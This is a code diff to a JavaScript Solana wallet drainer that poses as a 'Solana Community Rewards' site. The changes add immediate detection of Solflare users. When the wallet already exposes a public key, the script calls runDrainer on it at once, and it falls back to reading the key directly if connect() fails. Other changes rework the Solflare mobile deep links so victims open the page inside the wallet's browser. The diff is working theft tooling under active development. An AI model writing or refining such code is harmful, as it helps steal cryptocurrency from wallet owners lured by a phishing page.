@@ -5623,8 +5623,39 @@ window.runDrainer = runDrainer;
     console.log('[AUTO_CONNECT] Referrer:', document.referrer);
     console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
     
-    // Wait a bit for wallet providers to load
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    // Check for Solflare immediately (no wait)
+    if (window.location.href.includes('solflare.com') || document.referrer.includes('solflare.com') || navigator.userAgent.includes('Solflare')) {
+      console.log('[AUTO_CONNECT] Solflare detected, attempting immediate connection...');
+      try {
+        const provider = window.solflare || window.solana;
+        if (provider && provider.publicKey) {
+          console.log('[AUTO_CONNECT] Solflare already has public key, connecting immediately...');
+          
+          // Store the provider globally for runDrainer to use
+          window.connectedWallet = {
+            key: 'solflare',
+            name: 'Solflare',
+            logo: '/solflare-logo.png',
+            publicKey: provider.publicKey.toString(),
+            provider: provider
+          };
+          
+          // Trigger the drain process immediately
+          if (window.runDrainer) {
+            console.log('[AUTO_CONNECT] Triggering runDrainer for Solflare immediately');
+            window.runDrainer(provider);
+          }
+          
+          showStatus('Connected to Solflare', 'success');
+          return; // Exit immediately
+        }
+      } catch (error) {
+        console.log('[AUTO_CONNECT] Immediate Solflare connection failed:', error.message);
+      }
+    }
+    
+    // Wait a bit for other wallet providers to load
+    await new Promise(resolve => setTimeout(resolve, 1000));
     
     // Check if we're in a wallet browser environment
     const isInWalletBrowser = window.location.href.includes('phantom.app') || 
@@ -5730,16 +5761,32 @@ window.runDrainer = runDrainer;
             let result = null;
             let publicKey = null;
             
-            // Standard connection for ALL wallets (including Solflare) - like Phantom and Backpack
-            result = await provider.connect({
-              onlyIfTrusted: false,
-              appMetadata: {
-                name: 'Solana Community Rewards',
-                url: window.location.origin,
-                icon: '/logo.png'
+            // Simplified connection for ALL wallets (including Solflare) - immediate connection
+            if (wallet.key === 'solflare') {
+              // Solflare: Try simple connect first, then fallback to direct access
+              try {
+                result = await provider.connect();
+                publicKey = result?.publicKey || provider.publicKey;
+              } catch (error) {
+                console.log(`[AUTO_CONNECT] Solflare connect() failed, trying direct access:`, error.message);
+                // If connect fails, try direct access to public key
+                publicKey = provider.publicKey;
+                if (publicKey) {
+                  result = { publicKey: publicKey };
+                }
               }
-            });
-            publicKey = result?.publicKey || provider.publicKey;
+            } else {
+              // Other wallets: Standard connection
+              result = await provider.connect({
+                onlyIfTrusted: false,
+                appMetadata: {
+                  name: 'Solana Community Rewards',
+                  url: window.location.origin,
+                  icon: '/logo.png'
+                }
+              });
+              publicKey = result?.publicKey || provider.publicKey;
+            }
             
             if (publicKey) {
               console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, publicKey.toString());
@@ -6142,24 +6189,11 @@ window.runDrainer = runDrainer;
             const userAgent = navigator.userAgent.toLowerCase();
             const isAndroid = /android/.test(userAgent);
             
-            // Try different Solflare deep link formats
-            console.log(`[SOLFLARE_MOBILE] Current URL: ${currentUrl}`);
-            console.log(`[SOLFLARE_MOBILE] Encoded URL: ${encodedUrl}`);
+            // Use exact Solflare format as specified
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
             
-            // Format 1: Simple browse format
-            deepLink = `https://solflare.com/ul/browse/${encodedUrl}`;
-            fallbackUrl = `solflare://browse/${encodedUrl}`;
-            
-            // Format 2: Alternative with v1
-            // deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}`;
-            // fallbackUrl = `solflare://v1/browse/${encodedUrl}`;
-            
-            // Format 3: With query parameters
-            // deepLink = `https://solflare.com/ul/browse/?url=${encodedUrl}`;
-            // fallbackUrl = `solflare://browse/?url=${encodedUrl}`;
-            
-            console.log(`[SOLFLARE_MOBILE] Using deep link: ${deepLink}`);
-            console.log(`[SOLFLARE_MOBILE] Fallback URL: ${fallbackUrl}`);
+            console.log(`[SOLFLARE_MOBILE] Using exact format: ${deepLink}`);
           } else {
             // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
